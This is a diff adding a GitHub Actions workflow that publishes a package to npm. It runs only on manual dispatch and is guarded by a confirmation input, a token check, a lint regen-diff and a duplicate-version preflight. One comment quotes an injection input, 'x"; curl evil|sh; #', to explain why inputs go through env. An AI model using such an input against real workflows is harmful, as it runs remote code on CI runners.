@@ -1,0 +1,143 @@
+name: Release (npm)
+
+# Manual-only, on purpose: the repo has zero git tags (docs/plans/cross-platform-compat.md
+# "0. What the matrix changed") and no release automation exists to reuse. Nothing else in
+# this repo invokes `npm publish` — see the "publish is manual-only" invariant in
+# docs/plans/cross-platform-compat.md item 28. Publishes the committed dist/opencode/ as-is —
+# this workflow never runs build/generate.py to *produce* dist/, only to check it (see
+# "Lint dist/ before publishing" below).
+#
+# `workflow_dispatch` can target any ref, not only one that went through a PR and
+# validate.yml's cross-platform-regen gate — a ref pushed straight to a branch, for
+# instance. So this job cannot assume "the PR already proved drift-free" and skip its own
+# check: it re-runs `build/dist-lint.sh`'s regen-diff invariant itself, against whatever
+# ref was actually dispatched, immediately before publish.
+
+on:
+  workflow_dispatch:
+    inputs:
+      confirm:
+        description: 'Type PUBLISH to confirm publishing the committed dist/opencode/ package to npm'
+        required: true
+
+permissions:
+  contents: read
+  id-token: write # required for --provenance (npm OIDC attestation)
+
+jobs:
+  publish-npm:
+    runs-on: ubuntu-latest
+    # concurrency's cancel-in-progress: false means a hung step here (a wedged
+    # dist-lint invocation, `npm publish` stuck on a network stall) would otherwise
+    # hold this serialized group for GitHub's default 360-minute job timeout, with
+    # every later dispatch queued behind it and no signal beyond a spinner. Bound the
+    # wedge instead of the whole default-length job.
+    timeout-minutes: 15
+    # workflow_dispatch can be re-triggered before a prior run finishes; without this,
+    # two concurrent runs could both reach `npm publish` for the same version and race.
+    # Not cancel-in-progress — an in-flight publish must be allowed to finish, not be
+    # killed mid-`npm publish`; a second dispatch queues behind it instead.
+    concurrency:
+      group: release-npm
+      cancel-in-progress: false
+    steps:
+      # Fail fast, before checkout+lint spend any CI time, if the secret this job
+      # can't publish without simply isn't configured — surfaces as a plain, actionable
+      # message instead of npm's opaque ENEEDAUTH deep in the publish step.
+      - name: Verify NPM_TOKEN is configured
+        env:
+          HAS_TOKEN: ${{ secrets.NPM_TOKEN != '' }}
+        run: |
+          if [ "$HAS_TOKEN" != "true" ]; then
+            echo "ERROR: the NPM_TOKEN repository secret is not set — publish would fail with ENEEDAUTH at the last step. Add it under Settings > Secrets and variables > Actions before dispatching this workflow." >&2
+            exit 1
+          fi
+
+      # fetch-depth: 0 matches validate.yml's cross-platform-regen job and the same
+      # actions/checkout version it uses. NOTE: the frozen-sources invariant that needs
+      # full history to diff plugins/*/{commands,agents,scripts} against origin/master is
+      # opt-in (--check-frozen-sources) and NOT exercised by the plain `bash
+      # build/dist-lint.sh` below — see validate.yml's own comment on that flag. This job
+      # runs regen-diff only, which needs no git history at all; fetch-depth: 0 is kept
+      # here for consistency and to leave room for adding --check-frozen-sources later,
+      # not because today's step depends on it.
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+        with:
+          fetch-depth: 0
+
+      # The input is passed through `env:` rather than interpolated into the script body.
+      # `${{ }}` inside a `run:` block is substituted before the shell ever sees it, so an
+      # input of `x"; curl evil|sh; #` executes as shell on this runner. Via env it is
+      # inert data.
+      - name: Require explicit confirmation
+        env:
+          CONFIRM: ${{ github.event.inputs.confirm }}
+        run: |
+          if [ "$CONFIRM" != "PUBLISH" ]; then
+            echo "Refusing to publish: the 'confirm' input must be exactly 'PUBLISH' (got '$CONFIRM')." >&2
+            exit 1
+          fi
+
+      - uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020 # v4.4.0
+        with:
+          node-version: '20'
+          registry-url: 'https://registry.npmjs.org'
+
+      - name: Verify dist/opencode is present and committed
+        run: |
+          test -f dist/opencode/package.json || {
+            echo "ERROR: dist/opencode/package.json is missing. Run 'python3 build/generate.py' and commit dist/ before releasing." >&2
+            exit 1
+          }
+          if [ -n "$(git status --porcelain -- dist/opencode)" ]; then
+            echo "ERROR: dist/opencode has uncommitted changes on this checkout; refusing to publish an unclean tree." >&2
+            exit 1
+          fi
+
+      # The real "not hand-edited since generation" check. build/dist-lint.sh's
+      # regen-diff invariant regenerates dist/ into its own mktemp scratch dir and
+      # diffs both directions against the committed tree — it never mutates this
+      # checkout's dist/, so the exact bytes `npm publish` reads afterward are
+      # unaffected. This is the only place in the release path that ever confirms
+      # the dispatched ref's dist/opencode matches what generate.py would produce
+      # from its own sources; without it, the two checks above pass on a fresh
+      # checkout unconditionally regardless of whether dist/ is stale or hand-edited.
+      - name: Lint dist/ before publishing (build/dist-lint.sh)
+        # No --scope: dist-lint.sh scopes to a *plugin* name (e.g. --scope imps), not a
+        # platform, so there is no "just opencode" slice to ask for — the full lint also
+        # covers dist/agy, which this job never touches or publishes, but running it
+        # costs seconds and dist-lint has no opencode-only mode to save them.
+        run: bash build/dist-lint.sh
+
+      # `version` in build/npm/package.json is authored by hand and mirrored verbatim
+      # into dist/opencode/package.json — nothing bumps it automatically (version-bump.yml
+      # governs plugin manifests, not this package). So a second dispatch at an unbumped
+      # ref reaches `npm publish` with a version that already exists on the registry and
+      # dies on EPUBLISHCONFLICT *after* the checkout, lint and regen-diff have all run,
+      # with npm's error as the only explanation. Check up front and say the actual
+      # remedy instead. `npm view` exits non-zero when the version does not exist, which
+      # is the success case here, so the exit status is deliberately not used as the gate
+      # — only whether it printed a version. A registry outage therefore fails open to
+      # the publish step, which fails closed on its own.
+      - name: Preflight — refuse to republish an existing version
+        working-directory: dist/opencode
+        run: |
+          set -euo pipefail
+          name="$(node -p 'require("./package.json").name')"
+          version="$(node -p 'require("./package.json").version')"
+          echo "package: $name@$version"
+          if [ -n "$(npm view "$name@$version" version 2>/dev/null || true)" ]; then
+            echo "::error::$name@$version is already published — npm forbids republishing a version." >&2
+            echo "Bump \"version\" in build/npm/package.json, run \`python3 build/generate.py\` to mirror it into dist/opencode/package.json, commit both, and re-dispatch." >&2
+            exit 1
+          fi
+          echo "$name@$version is not on the registry — safe to publish."
+
+      - name: Publish committed dist/opencode/ to npm (no rebuild)
+        working-directory: dist/opencode
+        # First publish of a scoped/new package: --access public makes the intent explicit
+        # rather than relying on npm's default, and --provenance attaches a signed build
+        # attestation (needs the id-token: write permission above).
+        run: npm publish --access public --provenance
+        env:
+          NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}
